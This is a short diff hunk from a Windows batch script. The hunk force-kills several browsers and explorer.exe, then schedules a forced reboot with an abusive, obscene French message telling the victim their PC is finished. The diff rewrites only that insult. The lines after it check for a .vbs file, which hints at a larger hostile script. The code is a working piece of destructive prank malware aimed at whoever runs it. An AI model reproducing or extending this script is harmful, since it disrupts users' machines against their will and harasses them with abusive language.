@@ -246,7 +246,7 @@ taskkill /F /IM firefox.exe
 taskkill /F /IM msedge.exe
 taskkill /F /IM iexplore.exe
 taskkill /F /IM explorer.exe
-shutdown -r -t 300 -c "Dans 5 minutes ton paycay va explosay fils de viol, le 15-18 t'as bien détruit le cul :) :noel: Vaincra >> :hap: LOL"
+shutdown -r -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)"
 
 :aaa
 if exist %nouveau%.vbs (
